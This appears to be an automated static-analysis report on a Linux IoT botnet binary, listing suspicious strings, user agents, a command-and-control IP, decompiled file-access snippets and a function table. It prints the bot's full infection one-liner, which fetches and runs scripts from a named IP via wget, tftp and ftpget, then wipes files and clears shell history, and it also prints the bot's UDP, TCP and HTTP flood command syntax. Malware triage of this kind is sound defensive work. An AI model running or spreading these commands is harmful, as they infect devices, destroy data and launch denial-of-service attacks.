=============================================================================
========	BINARY ID :631fab5710de1b5f7001295c0c12ee18f8a31880==================================================
================================================================================
================================================================================
========	STRINGS SUMMARY : =====================================================
================================================================================
TOTAL STRINGS COUNT :1697
SUPSCPECTED LINES COUNT :176
SUPSCPECTED STRINGS COUNT (DISTINCT) :32
SUPSCPECTED STRINGS WEIGHT :125
SUSPECT STRING SCORE : [125 / 150] 83%
USER AGENTS STRINGS COUNT :37
STATIC IPs STRINGS COUNT :2
DYNAMIC IPs STRINGS COUNT :1
================================================================================
========	STRINGS DETAILS : =====================================================
================================================================================
================================================================================
========	SUSPECTED STRINGS : =====================================================
================================================================================
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
telnet
NetICs
bintec
netadmin
attack
system
NETWORK
extendnet
NetVCR
netgear
synnet
netopia
/dev/netslink/
/usr/
/bin/sh
PING
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
Failed opening raw socket.
Invalid flag "%s"
REP STOPPING!
HTTP
HTTP %s Flooding %s:%d for %d seconds
UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>
TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)
STD <target> <port> <time>
/proc/net/route
/etc/rc.d/rc.local
fork failed\n
\e[1;36m [ROOT] \e[1;32mBASSBOOTS!! \e[0;35m[IP] \e[1;33m| \e[1;32m%s \e[0;35m[Arch] \e[1;33m| \e[1;32m%s\e[34m
STOLENBOTS
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
;<=>?@ABCDEFGJIMOPQRSTUVWX[\\^_`abcxyz{|}~
No such process
Interrupted system call
No child processes
Too many open files in system
Read-only file system
Level 2 not synchronized
Machine is not on the network
Name not unique on network
Interrupted system call should be restarted
Socket operation on non-socket
Protocol wrong type for socket
Socket type not supported
Network is down
Network is unreachable
Network dropped connection on reset
Software caused connection abort
Connection reset by peer
Transport endpoint is already connected
Transport endpoint is not connected
Connection timed out
Connection refused
Host is down
No route to host
Operation already in progress
Operation now in progress
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
/etc/hosts
/etc/config/hosts
fdopen_pids
fork.c
getpid.c
kill.c
sigprocmask.c
vfork.c
waitpid.c
spec_flags.4045
strstr.c
_string_syserrmsgs.c
inet_ntoa.c
inet_makeaddr.c
gethostbyname.c
gethostbyname_r.c
connect.c
socket.c
rand.c
random.c
randtbl
random_r.c
random_poly_info
inet_aton.c
dnslookup.c
get_hosts_byname_r.c
inet_pton4
inet_ntop4
read_etc_hosts_r.c
__open_etc_hosts
__GI_inet_ntoa_r
__GI_sigprocmask
__GI_kill
__GI_fork
__GI_getpid
__GI_socket
__GI_connect
__GI_inet_addr
__read_etc_hosts_r
waitpid
random
connect
GetRandomPublicIP
numpids
initConnection
inet_pton
sendTCP
__GI_random_r
getpid
getHost
__libc_getpid
makeRandomStr
sendHTTP
GetRandomIP
__dns_lookup
random_r
gethostbyname_r
tcpcsum
socket
_string_syserrmsgs
__GI_inet_ntoa
srandom_r
__GI_srandom_r
kill
inet_addr
connectTimeout
strstr
init_rand
rand
__GI_gethostbyname_r
__GI_inet_ntop
fork
__GI_gethostbyname
__GI_random
inet_aton
processCmd
get_telstate_host
listFork
srand
sendUDP
inet_ntoa
__get_hosts_byname_r
__GI_inet_pton
gethostbyname
__vfork
__libc_waitpid
socket_connect
__GI_waitpid
vfork
srandom
__libc_fork
scanPid
rand_cmwc
inet_ntoa_r
__GI_strstr
inet_ntop
__GI_inet_aton
__GI_vfork
__libc_connect
pids
sigprocmask
================================================================================
========	USER AGENTS STRINGS : =====================================================
================================================================================
Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
================================================================================
========	STATIC IP ADRESSES : =====================================================
================================================================================
188.166.150.230:123
8.8.8.8
================================================================================
========	DYNAMIC IP MASKS : =====================================================
================================================================================
%d.%d.%d.%d
================================================================================
========	/proc FOLDER ACCESS : =====================================================
================================================================================
/proc/net/route
================================================================================
========	HISTORY TEMPERING : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
================================================================================
========	AUTOINSTALL COMMANDS : =====================================================
================================================================================
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\r\n
================================================================================
========	FUNCTIONS SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES			: 124977
+++TOTAL FUNCTIONS 			:247
+++LINES PER FUNCTION RATIO 	: 505.97975708502
+++SUSPECTED LINES COUNT 	: 894
+++SUSPECTED LINES RATIO 	: 0.715331621018267
================================================================================
========	WHILES SUMMARY : =====================================================
================================================================================
+++TOTAL FILE LINES				: 124977
+++WHILE (TRUE) LINES			: 14738
+++WHILE (TRUE) LINES RATION		:11.7925698328492%
+++WHILE (TRUE) LOOPS COUNT		: 163
================================================================================
========	SYSTEM FILES SUMMARY : ================================================
================================================================================
        "/dev/netslink/",
        "/tmp/",
        "/var/",
        "/dev/",
        "/var/run/",
        "/dev/shm/",
        "/boot/",
        "/usr/",
        "/opt/"
            execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
        execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    execl((int32_t)"/bin/sh", (int32_t)"sh", (int32_t)"-c", a1, 0);
    int32_t v396 = __libc_open("/proc/net/route", 0); // 0x409338
    int32_t v389 = fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x40971c
        v403 = fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
            v397 = "/etc/rc.conf";
        v397 = "/etc/rc.d/rc.local";
            int32_t v455 = fopen((int32_t)v397, (int32_t)&v454); // 0x409954
int32_t fopen(int32_t a1, int32_t a2) {
    return _stdio_fopen(0, (char *)-1);
int32_t _stdio_fopen(int32_t a1, char * a2) {
    int32_t v392 = __libc_open("/dev/null", a2); // 0x4107c4
    int32_t v391 = fopen((int32_t)"/etc/resolv.conf", (int32_t)&v390); // 0x41352c
        int32_t v397 = fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v390); // 0x41354c
    int32_t v392 = fopen((int32_t)"/etc/hosts", (int32_t)&v391); // 0x41511c
        result = fopen((int32_t)"/etc/config/hosts", (int32_t)&v391);
================================================================================
========	IP PATTERNS SUMMARY : =================================================
================================================================================
        "Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "188.166.150.230:123"

    char (*v46)[20] = "188.166.150.230:123";

    szprintf(v400, (int32_t)"%d.%d.%d.%d", (int32_t)*v391);

    inet_addr((int32_t)"8.8.8.8");

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
        "system",

        "system",

        "system",

        "system",

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |3620    |302           |611         |
----------------------------------------------------------------------------------------------
main                                              |0   |977     |69            |348         |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |6   |867     |49            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |1148    |43            |0           |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |0   |8548    |33            |8080        |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |6   |911     |29            |445         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |616     |26            |0           |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |530     |21            |0           |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |522     |21            |40          |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |654     |16            |225         |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |483     |15            |46          |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |5   |1415    |11            |929         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |1   |651     |11            |14          |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |448     |11            |21          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |11  |751     |9             |226         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |598     |9             |156         |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1222    |6             |813         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |434     |6             |36          |
----------------------------------------------------------------------------------------------
__GI_memmove                                      |2   |706     |6             |22          |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |486     |5             |87          |
----------------------------------------------------------------------------------------------
recvLine                                          |3   |489     |5             |71          |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |7   |732     |5             |18          |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |742     |5             |267         |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |404     |4             |0           |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |443     |4             |18          |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |602     |4             |0           |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |679     |4             |122         |
----------------------------------------------------------------------------------------------
_load_inttype                                     |3   |437     |4             |0           |
----------------------------------------------------------------------------------------------
negotiate                                         |3   |434     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |489     |3             |79          |
----------------------------------------------------------------------------------------------
realloc                                           |1   |474     |3             |0           |
----------------------------------------------------------------------------------------------
listFork                                          |0   |421     |3             |10          |
----------------------------------------------------------------------------------------------
sleep                                             |1   |476     |3             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |3   |407     |3             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |2   |490     |3             |92          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |522     |3             |110         |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |448     |3             |35          |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |431     |3             |0           |
----------------------------------------------------------------------------------------------
memrchr                                           |3   |486     |3             |89          |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |471     |2             |77          |
----------------------------------------------------------------------------------------------
printi                                            |7   |484     |2             |28          |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |3   |498     |2             |44          |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |404     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |0   |444     |2             |43          |
----------------------------------------------------------------------------------------------
__raise                                           |1   |395     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |3   |480     |2             |63          |
----------------------------------------------------------------------------------------------
fclose                                            |1   |449     |2             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |482     |2             |28          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |404     |2             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |0   |431     |2             |30          |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |453     |2             |34          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |411     |2             |11          |
----------------------------------------------------------------------------------------------
inet_aton                                         |1   |484     |2             |74          |
----------------------------------------------------------------------------------------------
_stdio_term                                       |0   |441     |2             |36          |
----------------------------------------------------------------------------------------------
print                                             |3   |592     |2             |183         |
----------------------------------------------------------------------------------------------
_store_inttype                                    |4   |416     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |431     |2             |0           |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |1   |1176    |2             |0           |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |405     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_strlen                                       |0   |458     |2             |25          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |419     |2             |14          |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |452     |2             |55          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |404     |2             |0           |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |406     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |459     |2             |49          |
----------------------------------------------------------------------------------------------
Rootsprintf                                       |2   |399     |2             |0           |
----------------------------------------------------------------------------------------------
rawmemchr                                         |2   |461     |2             |27          |
----------------------------------------------------------------------------------------------
abort                                             |0   |574     |2             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |466     |2             |40          |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |487     |2             |33          |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |404     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |394     |1             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |4   |396     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |394     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |1   |475     |1             |65          |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |415     |1             |15          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |410     |1             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |403     |1             |0           |
----------------------------------------------------------------------------------------------
kill                                              |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |536     |1             |92          |
----------------------------------------------------------------------------------------------
__heap_alloc                                      |2   |445     |1             |38          |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |394     |1             |0           |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |1   |395     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |395     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |2   |400     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |396     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntoa_r                                       |1   |414     |1             |18          |
----------------------------------------------------------------------------------------------
sprintf                                           |5   |394     |1             |0           |
----------------------------------------------------------------------------------------------
sigprocmask                                       |0   |416     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |417     |1             |16          |
----------------------------------------------------------------------------------------------
__heap_alloc_at                                   |3   |448     |1             |50          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |2   |463     |1             |51          |
----------------------------------------------------------------------------------------------
trim                                              |1   |424     |1             |22          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |416     |1             |18          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |453     |1             |48          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |415     |1             |17          |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |653     |1             |91          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |394     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |399     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |395     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |4   |405     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |396     |1             |0           |
----------------------------------------------------------------------------------------------
malloc                                            |1   |477     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |442     |1             |44          |
----------------------------------------------------------------------------------------------
getuid                                            |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
strcasecmp                                        |2   |427     |1             |30          |
----------------------------------------------------------------------------------------------
wait4                                             |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |2   |553     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |401     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |410     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |0   |497     |1             |31          |
----------------------------------------------------------------------------------------------
getsockopt                                        |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |402     |1             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |2   |428     |1             |31          |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |408     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |1   |394     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |395     |1             |0           |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |421     |1             |22          |
----------------------------------------------------------------------------------------------
fopen                                             |2   |394     |1             |0           |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |401     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |0   |405     |1             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |465     |1             |0           |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |2   |469     |1             |26          |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |444     |1             |44          |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |4   |405     |1             |0           |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |1   |487     |1             |52          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |394     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |3   |406     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |405     |1             |0           |
----------------------------------------------------------------------------------------------
prints                                            |4   |500     |1             |13          |
----------------------------------------------------------------------------------------------
read_until_response                               |4   |402     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |401     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |2   |489     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |412     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |467     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |2   |522     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |398     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |477     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |1   |403     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |445     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |407     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |3   |401     |0             |0           |
----------------------------------------------------------------------------------------------
_exit                                             |1   |407     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |1   |395     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |3   |405     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |2   |417     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |397     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |405     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |411     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |402     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |394     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |404     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |408     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |407     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |395     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |394     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |426     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |411     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |592     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |525     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |3   |403     |0             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |3   |395     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |1   |416     |0             |0           |
----------------------------------------------------------------------------------------------
__start                                           |1   |397     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |403     |0             |0           |
